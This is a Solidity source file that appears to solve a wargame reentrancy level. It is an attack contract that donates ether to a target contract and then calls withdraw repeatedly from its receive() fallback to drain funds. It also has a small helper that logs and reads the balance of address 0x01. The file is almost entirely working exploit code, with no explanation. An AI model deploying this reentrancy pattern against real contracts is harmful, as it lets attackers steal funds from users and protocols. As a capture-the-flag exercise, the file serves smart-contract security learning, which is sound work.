// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface ReentranceInterface {
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256 balance);
    function donate(address _to) external payable;
}
import "hardhat/console.sol";
contract AttackReentrance{

    ReentranceInterface public reentrance;

    constructor(address _reentrance) public {
        reentrance = ReentranceInterface(_reentrance);
    }

    function attack() external payable{
        reentrance.donate{value:msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    function attackAddress() external view returns(uint256){
        address shortAddress = address(0x01);
        console.log("shortAddress: ", shortAddress);
        return reentrance.balanceOf(shortAddress);
        
    }

    receive() external payable {
        reentrance.withdraw(msg.value);
    }
}